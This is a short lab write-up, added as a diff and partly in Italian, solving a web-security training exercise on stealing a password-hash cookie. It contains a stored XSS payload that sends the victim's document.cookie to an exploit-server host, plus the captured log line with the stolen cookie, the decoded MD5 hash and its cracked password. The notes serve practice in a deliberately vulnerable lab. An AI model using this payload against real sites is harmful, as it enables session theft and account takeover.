@@ -1,0 +1,17 @@
+This lab stores the user's password hash in a cookie.
+The lab also contains an XSS vulnerability in the comment functionality.
+To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password.
+Then, log in as carlos and delete his account from the "My account" page.
+
+
+
+
+COOKIE = Base64(nome_utnte+md5(password))
+In sezione commenti inserire la Stored XSS: <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+10.0.4.98       2023-03-02 15:29:44 +0000 "GET /secret=57HN6lWJYZvtcIpw7dtwO3YliYz1A9yW;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
+
+carlos:26323c16d5f4dabff3bb136f2460a943
+
+
+26323c16d5f4dabff3bb136f2460a943:onceuponatime
